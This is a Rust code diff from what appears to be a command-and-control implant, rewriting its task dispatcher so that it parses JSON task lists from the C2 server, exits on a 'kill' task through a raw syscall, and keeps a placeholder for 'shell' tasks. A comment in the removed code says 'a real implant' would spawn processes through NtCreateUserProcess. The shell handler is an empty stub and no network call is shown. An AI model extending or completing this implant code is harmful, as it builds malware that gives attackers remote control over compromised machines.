@@ -354,25 +354,38 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
     }
 }
 
+#[derive(Deserialize)]
+struct Task {
+    #[allow(dead_code)]
+    id: alloc::string::String,
+    #[serde(rename = "type_")]
+    task_type: alloc::string::String,
+    #[allow(dead_code)]
+    payload: alloc::string::String,
+}
+
+#[derive(Deserialize)]
+struct TaskList {
+    tasks: alloc::vec::Vec<Task>,
+}
+
 fn dispatch_tasks(data: &[u8]) {
-    if is_kill_command(data) {
-        unsafe {
-            crate::utils::syscalls::sys_exit(0);
+    // Trim null bytes if any (though slice should be exact)
+    let clean_data = if let Some(idx) = data.iter().position(|&x| x == 0) {
+        &data[..idx]
+    } else {
+        data
+    };
+
+    if let Ok(response) = serde_json::from_slice::<TaskList>(clean_data) {
+        for task in response.tasks {
+            match task.task_type.as_str() {
+                "kill" => unsafe { crate::utils::syscalls::sys_exit(0) },
+                "shell" => {
+                    // Stub for shell execution
+                },
+                _ => {}
+            }
         }
     }
-
-    // Shell execution stub
-    // In a real implant, we would parse the JSON properly and execute NtCreateUserProcess or similar.
-    if contains(data, b"\"shell\"") {
-        // execute shell...
-    }
-}
-
-fn contains(haystack: &[u8], needle: &[u8]) -> bool {
-    haystack.windows(needle.len()).any(|w| w == needle)
-}
-
-fn is_kill_command(data: &[u8]) -> bool {
-    // Naive search for "kill" command
-    contains(data, b"kill")
 }
